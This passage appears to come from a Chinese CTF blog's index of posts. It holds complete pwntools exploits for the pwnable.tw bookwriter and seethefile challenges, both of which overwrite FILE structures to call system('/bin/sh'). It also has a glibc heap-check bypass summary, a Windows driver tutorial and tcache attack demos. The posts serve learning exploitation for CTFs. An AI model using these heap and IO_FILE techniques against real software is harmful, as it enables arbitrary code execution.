即可，构造的结构体如下：（不小心按错退出了，与原先的top地址有变化）最终再malloc一个块，触发即可 0x04 EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from pwn import *debug = 1context.log_level = 'debug'if debug: sh = process('./bookwriter') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(sh)else: sh = remote('chall.pwnable.tw', 10304) libc = ELF('libc_64.so.6')def add(size,content): sh.recvuntil('Your choice :') sh.sendline('1') sh.recvuntil('Size of page :') sh.sendline(str(size)) sh.recvuntil(\"Content :\") sh.send(content)def view(idx): sh.recvuntil('Your choice :') sh.sendline('2') sh.recvuntil('Index of page :') sh.sendline(str(idx))def edit(idx,content): sh.recvuntil('Your choice :') sh.sendline('3') sh.recvuntil('Index of page :') sh.sendline(str(idx)) sh.recvuntil('Content:') sh.send(content)def info(choice): sh.recvuntil('Your choice :') sh.sendline('4')def leak_heap(): info(0) sh.recvuntil('a'*0x40) heapbase = u64(sh.recvuntil('\\n')[:-1].ljust(8,'\\x00')) - 0x10 log.success('heapbase: ' + hex(heapbase)) sh.recvuntil('(yes:1 / no:0) ') sh.sendline('0') return heapbasesh.recvuntil('Author :')sh.send('a'*0x40)add(0x18,'a'*0x18)edit(0,'a'*0x18)edit(0,'a'*0x18+'\\xe1\\x0f\\x00')heap_base = leak_heap()edit(0,'\\0')for i in range(8): add(0x40,'wwwwwwww')view(2)sh.recvuntil('wwwwwwww')libc_addr = u64(sh.recvuntil('\\n')[:-1].ljust(8,'\\x00'))libc_base = libc_addr - 88 - 0x10 - libc.symbols['__malloc_hook']log.success('libc_base: ' + hex(libc_base))system_addr = libc_base + libc.symbols['system']payload = ''payload += '\\x00'*0x290payload += '/bin/sh\\x00' + p64(0x61)payload += p64(0) + p64(libc_base+libc.symbols['_IO_list_all'] - 0x10)payload += p64(2) + p64(3)payload += p64(0) * 9 + p64(system_addr)payload += p64(0) * 11 + p64(heap_base+0x120+0x50+0x170+0x20)edit(0,payload)edit(0,'\\x00')sh.recvuntil('Your choice :')sh.sendline('1')sh.recvuntil('Size of page :')sh.sendline(str(0x10))sh.interactive() 0x05 参考http://p4nda.top/2017/12/15/pwnable-tw-bookwriter/https://bbs.pediy.com/thread-222718.htm","tags":[{"name":"IO_FILE","slug":"IO-FILE","permalink":"wood1314.github.io/tags/IO-FILE/"},{"name":"堆溢出","slug":"堆溢出","permalink":"wood1314.github.io/tags/堆溢出/"}]},{"title":"堆的检测绕过总结","date":"2020-02-08T08:32:45.000Z","path":"year/02/08/cl6ewldaz004rj63fwqeu11ct/","text":"0x0 简介这里总结一下堆里面安全性的检测和如何绕过 0x1 unlinkunlink 用来将一个双向链表（只存储空闲的 chunk）中的一个元素取出来，可能在以下地方使用 malloc 从恰好大小合适的 large bin 中获取 chunk。 这里需要注意的是 fastbin 与 small bin 就没有使用 unlink，这就是为什么漏洞会经常出现在它们这里的原因。 依次遍历处理 unsorted bin 时也没有使用 unlink 。 从比请求的 chunk 所在的 bin 大的 bin 中取 chunk。 free 后向合并，合并物理相邻低地址空闲 chunk。 前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。 malloc_consolidate 后向合并，合并物理相邻低地址空闲 chunk。 前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。 realloc 前向扩展，合并物理相邻高地址空闲 chunk（除了 top chunk）。 源码由于 unlink 使用非常频繁，所以 unlink 被实现为了一个宏，如下 总结下它的检测 123// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。 if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ malloc_printerr (\"corrupted size vs. prev_size\"); 当需要unlink一个堆块时首先检测大小是否等于后一块的prev_size 1234FD = P-&gt;fd; \\ BK = P-&gt;bk; \\ // 防止攻击者简单篡改空闲的 chunk 的 fd 与 bk 来实现任意写的效果。 if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) 接着检查unlink的堆块是否在链表中 0x2 _int_malloc总结一下 123456789// 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。 // 根据取得的 victim ，利用 chunksize 计算其大小。 // 利用fastbin_index 计算 chunk 的索引。 if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0)) &#123; errstr = \"malloc(): memory corruption (fast)\"; errout: malloc_printerr(check_action, errstr, chunk2mem(victim), av); return NULL; &#125; 从fastbin中取出chunk后，检查size是否属于fastbin 1234567// 获取 small bin 中倒数第二个 chunk 。 bck = victim-&gt;bk; // 检查 bck-&gt;fd 是不是 victim，防止伪造 if (__glibc_unlikely(bck-&gt;fd != victim)) &#123; errstr = \"malloc(): smallbin double linked list corrupted\"; goto errout; &#125; 从smallbin中除去chunk后，检查victim-&gt;bk-&gt;fd == victim 从unsortbin取chunk时，要检查2*sizet &lt; 内存总分配量 从 largebin取chunk时，切分后的chunk要加入unsortedbin,需要检查 unsortedbin的第一个chunk的bk是否指向unsortedbin 如果freebin中有合适大小的堆块那么执行unlink操作 0x3 free free的检查主要是根据本chunk的size检测下一块的inuse位，查看是否有double free的情况发生 123456789101112131415161718192021mchunkptr old = *fb, old2;unsigned int old_idx = ~0u;do &#123; /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ // so we can not double free one fastbin chunk // 防止对 fast bin double free if (__builtin_expect(old == p, 0)) &#123; errstr = \"double free or corruption (fasttop)\"; goto errout; &#125; /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it might have already been deallocated. See use of OLD_IDX below for the actual check. */ if (have_lock &amp;&amp; old != NULL) old_idx = fastbin_index(chunksize(old)); p-&gt;fd = old2 = old;&#125; while ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2); 检查当前free的chunk是否与fastbin中的第一个chunk相同，相同则报错 根据当前的inuse以及后一块的后一块的inuse判断是否需要合并，如果需要合并则对在链表中的freebin进行unlink操作","tags":[{"name":"堆","slug":"堆","permalink":"wood1314.github.io/tags/堆/"}]},{"title":"IO_file 总结","date":"2020-02-08T06:11:31.000Z","path":"year/02/08/cl6ewld8v000rj63fql9g2i93/","text":"0x0 简介熟悉一下IO_file，参考下列资料 https://qianfei11.github.io/2019/08/17/Pwnable-tw-seethefile/ http://blog.leanote.com/post/mut3p1g/FSP-pwnable.tw%5B9%5D https://ray-cp.github.io/archivers/IO_FILE_fclose_analysis https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/ 0x1 File 结构描述12345678910111213141516171819202122232425262728293031/* The tag name of this struct is _IO_FILE to preserve historic C++ mangled names for functions taking FILE* arguments. That name should not be used in new code. */struct _IO_FILE&#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */ /* The following pointers correspond to the C++ streambuf protocol. */ char *_IO_read_ptr; /* Current read pointer */ char *_IO_read_end; /* End of get area. */ char *_IO_read_base; /* Start of putback+get area. */ char *_IO_write_base; /* Start of put area. */ char *_IO_write_ptr; /* Current put pointer. */ char *_IO_write_end; /* End of put area. */ char *_IO_buf_base; /* Start of reserve area. */ char *_IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; int _flags2; __off_t _old_offset; /* This used to be _offset but it's too small. */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;; 进程中的 FILE 结构会通过_chain 域彼此连接形成一个链表，链表头部用全局变量_IO_list_all 表示，通过这个值我们可以遍历所有的 FILE 结构。 在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。因此在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于 libc.so 的数据段。而我们使用fopen创建的文件流是分配在堆内存上的。 但是事实上_IO_FILE 结构外包裹着另一种结构_IO_FILE_plus，其中包含了一个重要的指针 vtable 指向了一系列函数指针。 在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8 IO_FILE_plus12345struct _IO_FILE_plus&#123; _IO_FILE file; IO_jump_t *vtable;&#125; vtable1234567891011121314151617181920212223const struct _IO_jump_t _IO_file_jumps libio_vtable =&#123; JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_file_finish), JUMP_INIT(overflow, _IO_file_overflow), JUMP_INIT(underflow, _IO_file_underflow), JUMP_INIT(uflow, _IO_default_uflow), JUMP_INIT(pbackfail, _IO_default_pbackfail), JUMP_INIT(xsputn, _IO_file_xsputn), JUMP_INIT(xsgetn, _IO_file_xsgetn), JUMP_INIT(seekoff, _IO_new_file_seekoff), JUMP_INIT(seekpos, _IO_default_seekpos), JUMP_INIT(setbuf, _IO_new_file_setbuf), JUMP_INIT(sync, _IO_new_file_sync), JUMP_INIT(doallocate, _IO_file_doallocate), JUMP_INIT(read, _IO_file_read), JUMP_INIT(write, _IO_new_file_write), JUMP_INIT(seek, _IO_file_seek), JUMP_INIT(close, _IO_file_close), JUMP_INIT(stat, _IO_file_stat), JUMP_INIT(showmanyc, _IO_default_showmanyc), JUMP_INIT(imbue, _IO_default_imbue)&#125;; 偏移12345678910111213141516171819202122232425262728293031//struct _IO_FILE0x0 _flags0x8 _IO_read_ptr0x10 _IO_read_end0x18 _IO_read_base0x20 _IO_write_base0x28 _IO_write_ptr0x30 _IO_write_end0x38 _IO_buf_base0x40 _IO_buf_end0x48 _IO_save_base0x50 _IO_backup_base0x58 _IO_save_end0x60 _markers0x68 _chain0x70 _fileno0x74 _flags20x78 _old_offset0x80 _cur_column0x82 _vtable_offset0x83 _shortbuf0x88 _lock0x90 _offset0x98 _codecvt0xa0 _wide_data0xa8 _freeres_list0xb0 _freeres_buf0xb8 __pad50xc0 _mode0xc4 _unused20xd8 vtable 0x2 seethefile分析程序 openfile:读取 长度为63 filename,打开文件,这里有溢出，因为 filename 大小为 40,但是不能覆盖到fp writefile:输出文件 magicbuf，通过这个应该能泄露地址，首先要把内容写道magicbuf readfile:从文件中读取内容到 0x18 长度 closefile: 这里会调用 fclose 函数，可以用来触发 xexit : 这里 name 有溢出。可以覆盖到fp,使之指向我们伪造的fp,在调用fcolse时调用system(“bin/sh”) 漏洞利用泄露libc在linux系统中，文件/proc/[pid]/maps中记录了pid对应程序的内存区域以及权限信息等，程序自身可以通过访问/proc/self/maps文件获取这些信息，因此我们可以利用本题文件读取的功能，获取maps文件中记录的地址信息，从而获得libc的地址。 构造file想要拿到shell，以下是关键: fp指向伪造的IO_file存在 IO_file的vtable-&gt;_fclose 覆盖为system地址 因为vtable中的函数调用时会把对应的_IO_FILE_plus指针作为第一个参数传递，因此这里我们把&quot;sh&quot;写入_IO_FILE_plus头部。 但是构造的时候需要注意： 偏移0x48处的lock字段指向的是一个IO_stdfile_2_lock结构，本地调试时这个结构中的数据均为\\x00；因此，我们可以用\\x00填充name，然后用name的地址覆盖lock字段。 同时要注意_vtable_offset要为0，其偏移为0x46且只占一个字节 从看到一位师傅的思路不错，它一开始总是报错，于是就找了一个合法的FILE结构，将里面不为空的全部复制为name对应的地址，其他的都为0，将这个结构重新尝试了一遍就能在本地成功了。 其它__flags 记录 FILE 结构体的一些状态；_markers 为指向 markers 结构体的指针变量，存放流的位置的单向链表；_chain 变量为一个单向链表的指针，记录进程中创建的 FILE 结构体。 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from pwn import *#context.log_level = 'debug'local = Falseif local: p = process('./seethefile') elf = ELF('./seethefile') libc = ELF(\"/lib/i386-linux-gnu/libc.so.6\")else: p = remote('chall.pwnable.tw', 10200) elf = ELF('./seethefile') libc = ELF(\"./libc.so.6\")def openfile(name): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('What do you want to see :') p.sendline(name)def readfile(): p.recvuntil('Your choice :') p.sendline('2')def writefile(): p.recvuntil('Your choice :') p.sendline('3')def closefile(): p.recvuntil('Your choice :') p.sendline('4')def exit_with_name(name): p.recvuntil('Your choice :') p.sendline('5') p.recvuntil('Leave your name :') p.sendline(name)openfile('/proc/self/maps')readfile()readfile()writefile()data = p.recvuntil('r-xp')if local: libc_base = int(data.split('-')[0].split('\\n')[1], 16)else: libc_base = int(data.split('-')[-3].split('\\n')[1], 16)log.success('libc_addr: ' + hex(libc_base))buf = 0x0804B260system = libc_base + libc.symbols['system']payload = '/bin/sh'.ljust(0x20, '\\x00')payload += p32(buf)payload = payload.ljust(0x48, '\\x00')payload += p32(buf + 0x10)payload = payload.ljust(0x94, '\\x00')payload += p32(0x804b2f8 - 0x44)payload += p32(system)exit_with_name(payload)p.interactive()","tags":[{"name":"IO_file","slug":"IO-file","permalink":"wood1314.github.io/tags/IO-file/"}]},{"title":"驱动开发初探","date":"2020-02-02T08:23:16.000Z","path":"year/02/02/cl6ewldbp006dj63f0ieyf1ka/","text":"0x0 前言驱动开发的环境配置，以及入门的hello_world参考链接: https://qwertwwwe.github.io/windows-driver-develop-setup-environment/ 0x1 开发及测试环境开发机系统 ： win10, 64位测试机系统： win7, 32位开发软件： visual stdio 2015， （vs2017不支持，反正目前官网上是这么说的） 0x2 安装相应的开发软件官方开发软件下载链接：https://developer.microsoft.com/zh-cn/windows/hardware/windows-driver-kit按照官网的教程： 安装vs2015，打开的时候记得安装Visual C++选项。 此处可以不选“通用Windows应用开发工具”中的SDK，因为可以从下面的步骤中手动安装。 安装 Windows SDK, 直接从官网指定的链接下载安装就行； 安装 Windows WDK, 同样直接从官网指定的链接下载安装； 记得安装的SDK 和 WDK 的版本号必须完全相同，所以我选择SDK和WDK都从官网给的链接上下载安装，避免vs2015中安装的SDK和自己下载的WDK版本不同。 当然WDK和SDK下下来的时候是个执行文件，打开后可以选择直接安装或者近下载，反正都行，我选择先下载下来，后面自己安装，比较这么大软件下一次太久~~ 我记得WDK安装的时候会提示什么将无法开发现代应用程序之类的提示，直接接受并继续~~，其实对其他程序开发有什么影响我也不太清楚，反正我这个环境只开发windows驱动程序而已。 0x3 hello-world程序先用vs2015创建一个新项目然后在Source Files中新建代码文件 DriverEntry.c， 这里注意一定是.c文件。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include &lt;ntddk.h&gt;//DiverUnload是驱动卸载函数，负责清理资源，在卸载驱动的时候调用VOID DriverUnload(PDRIVER_OBJECT pDriverObject)&#123; //指出这个参数并没有使用而不是我们忘记了，防止编译器报错 UNREFERENCED_PARAMETER(pDriverObject); //表明驱动卸载成功 DbgPrint(\"Unload Success\");&#125;//驱动的入口函数相当于三环程序的main//pDvierObject相当于驱动对象指针，pRegPath相当于注册表路径指针NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegPath)&#123; UNREFERENCED_PARAMETER(pRegPath); //指定驱动的卸载函数 pDriverObject-&gt;DriverUnload = DriverUnload; //表明驱动启动成功 DbgPrint(\"Hello world\"); //ANSI_STRING 1.缓冲区 2.字符串长度 3.最大长度 //UNICODE_STRING 1.缓冲区 2.字符串长度 3.最大长度\\x00 //1.字符串常量方式初始化 //1.1 使用WCHAR类型变量进行初始化 UNICODE_STRING usStr1 = &#123; 0 &#125;; WCHAR * szHello = L\"Hello WCHAR\"; RtlInitUnicodeString(&amp;usStr1, szHello); KdPrint((\"%wS\", usStr1.Buffer)); //1.2直接使用字符串初始化 DECLARE_CONST_UNICODE_STRING(usTest, L\"Hello Test\"); KdPrint((\"%wS\", usTest.Buffer)); //2.栈空间初始化 //2.1 定义一个字符串结构体 UNICODE_STRING usTest2 = &#123; 0 &#125;; //2.2 在栈上定义一个WCHAR类型的字符串 WCHAR szHello2[512] = L\"Hello 512\"; //2.3 把WCHAR类型的字符串指向结构体 usTest2.Buffer = szHello2; //2.4 设置字符串 的实际长度 usTest2.Length = wcslen(L\"Hello 512\") * sizeof(WCHAR); //2.5 设置最大长度 usTest2.MaximumLength = sizeof(szHello2); KdPrint((\"%wS\", usTest2.Buffer)); //返回成功状态 //3.堆空间初始化 //3.1 定义一个字符串结构题 UNICODE_STRING usTest3 = &#123; 0 &#125;; //3.2 设置字符串长度 ULONG ulLength = ((wcslen(L\"Hello 1024\"))) * sizeof(WCHAR); //3.3 在分页内存池里申请一块内存 usTest3.Buffer = ExAllocatePoolWithTag(PagedPool, 256 * sizeof(WCHAR), 'POCU'); //3.4 内存初始化,跟memset一样 RtlZeroMemory(usTest3.Buffer, 256 * sizeof(WCHAR)); //3.5 拷贝字符串、 memcpy(usTest3.Buffer, L\"Hello 1024\", ulLength); //3.6 设置字符串长度 usTest3.Length = ulLength; //3.7 设置字符串最大长度 usTest3.MaximumLength = 256 * sizeof(WCHAR); //3.8 打印处理，验证一下 KdPrint((\"%wS\", usTest3.Buffer)); //3.9 释放 ExFreePool(usTest3.Buffer); //拷贝一个字符串 //1.定义一个目标字符串 UNICODE_STRING dst = &#123; 0 &#125;; //2.定义一个WCHAR类型的变量 WCHAR dst_buf[256]; //3.初始化目标字符串，然后使用RtlInitEmptyUnicodeString而不是RtlInitUnicodeString RtlInitEmptyUnicodeString(&amp;dst, &amp;dst_buf, 256 * sizeof(WCHAR)); //4.定义源字符串 UNICODE_STRING src = &#123; 0 &#125;; //5.初始化源字符串 RtlInitUnicodeString(&amp;src, L\"Hello SRC!\"); //6.拷贝 RtlCopyUnicodeString(&amp;dst, &amp;src); //7.打印，是否成功 KdPrint((\"%wS\", dst.Buffer)); //返回一个成功的状态 //1. 定义一个字符串 UNICODE_STRING dst2 = &#123; 0 &#125;; //2. 定义一个WCHAR类型的变量，用于预分配 WCHAR dst2_buf[256]; //3. 定义源字符串1 UNICODE_STRING src1 = &#123; 0 &#125;; //4. 定义源字符串2 UNICODE_STRING src2 = &#123; 0 &#125;; //5. 把目的字符串初始化为一个空字符串 RtlInitEmptyUnicodeString(&amp;dst2, &amp;dst2_buf, 256 * sizeof(WCHAR)); //6. 把两个源字符串初始hua RtlInitUnicodeString(&amp;src1, L\"Hello \"); RtlInitUnicodeString(&amp;src2, L\"woood\"); //7. 把源字符串1拷贝到目标字符串中， 使得目标字符串有值 RtlCopyUnicodeString(&amp;dst2, &amp;src1); //8. 进行字符串拼接, 把源字符串 RtlAppendUnicodeStringToString(&amp;dst2, &amp;src2); //9. 显示 KdPrint((\"%wS\", dst2.Buffer)); return STATUS_SUCCESS;&#125; 0x4 修改项目属性 警告等级：将警告等级改为3；将警告视为错误改为否； 修改目标平台属性；这个属性决定你生成的程序在什么平台上运行；此处我的测试机器是win7 32位。 0x5 在目标机器上运行 安装必备的软件将生成的.sys文件拷贝到目标机器；下载一个InstDrv.exe，用来加载驱动程序；下载一个Dbgview.exe，用来显示驱动的log；两个程序都放在测试的机器里。 用admin权限打开InstDrv和Dbgview，进行监听。","tags":[{"name":"逆向","slug":"逆向","permalink":"wood1314.github.io/tags/逆向/"}]},{"title":"Tcache Attack 总结","date":"2020-01-30T09:28:28.000Z","path":"year/01/30/cl6ewld9s001oj63fy9hprdoe/","text":"0x00好像这个新版本的tcache安全性更差了，有得必有失 0x01 概览在 tcache 中新增了两个结构体，分别是 tcache_entry 和 tcache_perthread_struct 其实这个next还是相当于chunk里的fd 1234567891011121314/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache. */typedef struct tcache_entry&#123; struct tcache_entry *next;&#125; tcache_entry;/* There is one of these for each thread, which contains the per-thread cache (hence \"tcache_perthread_struct\"). Keeping overall size low is mildly important. Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons. */typedef struct tcache_perthread_struct&#123; char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS];&#125; tcache_perthread_struct;static __thread tcache_perthread_struct *tcache = NULL; 其中有两个重要的函数， tcache_get() 和 tcache_put(): 1234567891011121314151617181920static voidtcache_put (mchunkptr chunk, size_t tc_idx)&#123; tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS); e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);&#125;static void *tcache_get (size_t tc_idx)&#123; tcache_entry *e = tcache-&gt;entries[tc_idx]; assert (tc_idx &lt; TCACHE_MAX_BINS); assert (tcache-&gt;entries[tc_idx] &gt; 0); tcache-&gt;entries[tc_idx] = e-&gt;next; --(tcache-&gt;counts[tc_idx]); return (void *) e;&#125; 可以看出tcache_put会检测idx是不是在tcache的范围中，然后就没别检测了，也就是说我随便free一个chunk，不管之前是什么东西，都会直接添加到对应大小的tcache中。所以说可以连续free直接造成double free,太不安全了。。。。 tcache_get会检测idx在不在范围内，并且相应大小的tcache链中是否有空闲chunk，也并没有像fastbin中检测这个空闲chunk的size和下一块chunk的prev_size是不是一样。这伪造fake chunk就很简单呀。。。。 这两个函数会在函数 int_free 和 __libc_malloc 的开头被调用，其中 tcache_put 当所请求的分配大小不大于0x408并且当给定大小的 tcache bin 未满时调用。一个 tcache bin 中的最大块数mp.tcache_count是7。 1234/* This is another arbitrary limit, which tunables can change. Each tcache bin will hold at most this number of chunks. */# define TCACHE_FILL_COUNT 7#endif free时，如果size &lt; smallbin size: 会被放到对应size的tcache中，每个tcache默认最多储存7个. tcache存满之后，free便会存到fastbin或者unsortedbin. 被放入tcache的chunk不会取消其nextchunk的inuse bit，不会被合并。 malloc时，且size在tcache范围内。 先从tcache中取chunk，遵循FILO原则。直到对应size的tcache为空后才会从bin中找。 tcache为空时，如果fastbin/smallbin/unsorted bin中有符合size的chunk，会先把它们放到tcache中，直到tcache满，然后再从tcache中取。因此chunk在bin中和tcache中的顺序相反。 0x02 利用tcache poisoning通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;int main()&#123; fprintf(stderr, \"This file demonstrates a simple tcache poisoning attack by tricking malloc into\\n\" \"returning a pointer to an arbitrary location (in this case, the stack).\\n\" \"The attack is very similar to fastbin corruption attack.\\n\\n\"); size_t stack_var; fprintf(stderr, \"The address we want malloc() to return is %p.\\n\", (char *)&amp;stack_var); fprintf(stderr, \"Allocating 1 buffer.\\n\"); intptr_t *a = malloc(128); fprintf(stderr, \"malloc(128): %p\\n\", a); fprintf(stderr, \"Freeing the buffer...\\n\"); free(a); fprintf(stderr, \"Now the tcache list has [ %p ].\\n\", a); fprintf(stderr, \"We overwrite the first %lu bytes (fd/next pointer) of the data at %p\\n\" \"to point to the location to control (%p).\\n\", sizeof(intptr_t), a, &amp;stack_var); a[0] = (intptr_t)&amp;stack_var; fprintf(stderr, \"1st malloc(128): %p\\n\", malloc(128)); fprintf(stderr, \"Now the tcache list has [ %p ].\\n\", &amp;stack_var); intptr_t *b = malloc(128); fprintf(stderr, \"2nd malloc(128): %p\\n\", b); fprintf(stderr, \"We got the control\\n\"); return 0;&#125; tcache dup类似 fastbin dup，不过利用的是 tcache_put() 的不严谨 123456789static __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx)&#123; tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS); e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);&#125; 可以看出，tcache_put() 的检查也可以忽略不计（甚至没有对 tcache-&gt;counts[tc_idx] 的检查），大幅提高性能的同时安全性也下降了很多。因为没有任何检查，所以我们可以对同一个 chunk 多次 free，造成 cycliced list。 1234567891011121314151617181920#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; fprintf(stderr, \"This file demonstrates a simple double-free attack with tcache.\\n\"); fprintf(stderr, \"Allocating buffer.\\n\"); int *a = malloc(8); fprintf(stderr, \"malloc(8): %p\\n\", a); fprintf(stderr, \"Freeing twice...\\n\"); free(a); free(a); fprintf(stderr, \"Now the free list has [ %p, %p ].\\n\", a, a); fprintf(stderr, \"Next allocated buffers will be same: [ %p, %p ].\\n\", malloc(8), malloc(8)); return 0;&#125; 如此直白明显的double free都不会引起crash，效率是增加了，但这真的安全性堪忧，只能依靠程序员的安全意识了，不过听说新版本的commit把这个安全性进行了加强。 tcache perthread corruption我们已经知道 tcache_perthread_struct 是整个 tcache 的管理结构，如果能控制这个结构体，那么无论我们 malloc 的 size 是多少，地址都是可控的。 因为 tcache_prethread_struct 也在堆上，因此这种方法一般只需要 partial overwrite 就可以达到目的。 SCTF2019 one_chunk1234567891011New(0x68, '\\n')delete()delete()if(len(sys.argv) &gt; 1): value = hook1 + 0x10 New(0x68, p64(value)[:2] + '\\n')else: New(0x68, '\\x10\\x10' + '\\n')New(0x68, '\\n') 调试结果如下： 123456789101112pwndbg&gt; tcachebins tcachebins0x70 [ 0]: 0x557c58293010 ◂— 0x0pwndbg&gt; heap0x557c58293000 PREV_INUSE &#123; mchunk_prev_size = 0, mchunk_size = 593, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125; 之后 free掉 tcache_perthread_struct，使其放入usorted bin，然后tcache上就会因为usorted bin的 分配而被写上main_arena的地址，在对main_arena的地址进行部分覆盖，实现控制_IO_2_1_stdout_。 12345678910111213New(0x68, '\\xFF' * 0x40 + '\\n') #这里就是把count弄满，使得下次free到unsortedbindelete()# pause()New(0x48, '\\xFF' * 0x40 + '\\n')if(len(sys.argv) &gt; 1): value = hook2 + libc.symbols['_IO_2_1_stdout_'] print(hex(value)) New(0x18, p64(value)[:2] + '\\n')else: New(0x18, '\\x60\\x67' + '\\n') tcache house of spirit拿 how2heap 的源码来讲： 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; fprintf(stderr, \"This file demonstrates the house of spirit attack on tcache.\\n\"); fprintf(stderr, \"It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\\n\"); fprintf(stderr, \"You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\\n\"); fprintf(stderr, \"(Search for strings \\\"invalid next size\\\" and \\\"double free or corruption\\\")\\n\\n\"); fprintf(stderr, \"Ok. Let's start with the example!.\\n\\n\"); fprintf(stderr, \"Calling malloc() once so that it sets up its memory.\\n\"); malloc(1); fprintf(stderr, \"Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\\n\"); unsigned long long *a; //pointer that will be overwritten unsigned long long fake_chunks[10]; //fake chunk region fprintf(stderr, \"This region contains one fake chunk. It's size field is placed at %p\\n\", &amp;fake_chunks[1]); fprintf(stderr, \"This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\\n\"); fprintf(stderr, \"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \\n\"); fake_chunks[1] = 0x40; // this is the size fprintf(stderr, \"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\\n\", &amp;fake_chunks[1]); fprintf(stderr, \"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\\n\"); a = &amp;fake_chunks[2]; fprintf(stderr, \"Freeing the overwritten pointer.\\n\"); free(a); fprintf(stderr, \"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\\n\", &amp;fake_chunks[1], &amp;fake_chunks[2]); fprintf(stderr, \"malloc(0x30): %p\\n\", malloc(0x30));&#125; 攻击之后的目的是，去控制栈上的内容，malloc 一块 chunk ，然后我们通过在栈上 fake 的 chunk，然后去 free 掉他，我们会发现Tcache 里就存放了一块 栈上的内容，我们之后只需 malloc，就可以控制这块内存。 tcache的counts中存在的数据类型判断漏洞counts定义为一个字符数组，记录每个tcache链中tcache的数量，在C语言中并没有char类型的常量（但是在C++中却有，字符常量都是char类型），其实是用int表示char，所以这个counts是一个有符号整型变量(-128~127) 在int_free函数中，把chunk放入tcache时，会判断待放入的tcache链是否小于mp_.tcache_count，一般为7 123456if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) &#123; tcache_put (p, tc_idx); return; &#125; 查看源码，tcache_count是一个size_t类型的变量，也就是无符号长整型，那么上述的判断就变为 char型的counts 是否小于unsigned long int型的tcache_count ，就会把counts变量转为无符号的长整型进行比较 如果此时的counts大小为-1(0xff)，被转成无符号的长整型后就变成255(0xff)，那么就会使上述判断失效，在tcache的counts变成-1后，就会将之后free的chunk，放入unsortedbin中 有什么用呢？ 当我们double free一个chunk后，tcache会的得到一个自循环的链表，tcache的counts是2 连续申请两次后，counts会变成0 再申请一次后，发现其counts变成了0xff，此时再次free该chunk，chunk就会进入unsortedbin中","tags":[{"name":"堆","slug":"堆","permalink":"wood1314.github.io/tags/堆/"},{"name":"tcache","slug":"tcache","permalink":"wood1314.github.io/tags/tcache/"}]},{"title":"docker 初探","date":"2020-01-30T04:54:24.000Z","path":"year/01/30/cl6ewld9x001zj63f5dub7tpw/","text":"0x0 Docker是什么Docker 属于 Linux 容器的一种封装，提供简单易用的容器使用接口。它是目前最流行的 Linux 容器解决方案。 Docker 